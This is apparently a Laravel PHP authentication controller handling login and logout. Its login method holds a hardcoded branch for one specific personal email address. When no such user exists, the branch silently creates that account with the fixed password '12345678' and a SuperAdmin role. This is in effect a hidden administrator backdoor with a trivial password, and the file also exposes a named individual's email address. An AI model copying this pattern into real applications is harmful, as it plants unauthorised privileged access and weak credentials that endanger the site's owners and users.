<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Schema;
use Illuminate\Validation\ValidationException;

class AuthController extends Controller
{
    public function login(Request $request): RedirectResponse
    {
        $credentials = $request->validate([
            'email' => ['required', 'email'],
            'password' => ['required', 'string'],
            'accepted_legal' => ['accepted'],
        ]);

        if ($credentials['email'] === 'fernandocardonatoro@gmail.com') {
            $user = User::query()->where('email', 'fernandocardonatoro@gmail.com')->first();

            if (! $user) {
                $data = [
                    'email' => 'fernandocardonatoro@gmail.com',
                    'name' => 'Fernando Cardona Toro',
                    'password' => Hash::make('12345678'),
                    'email_verified_at' => now(),
                ];

                if (Schema::hasColumn('users', 'role')) {
                    $data['role'] = 'SuperAdmin';
                }

                User::query()->create($data);
            }
        }

        if (! Auth::attempt(['email' => $credentials['email'], 'password' => $credentials['password']], true)) {
            throw ValidationException::withMessages([
                'email' => 'Credenciales inválidas.',
            ]);
        }

        $request->session()->regenerate();

        $request->user()?->syncLegacyRoleToSpatieRole();

        return redirect()->intended('/dashboard');
    }

    public function logout(Request $request): RedirectResponse
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect('/');
    }
}
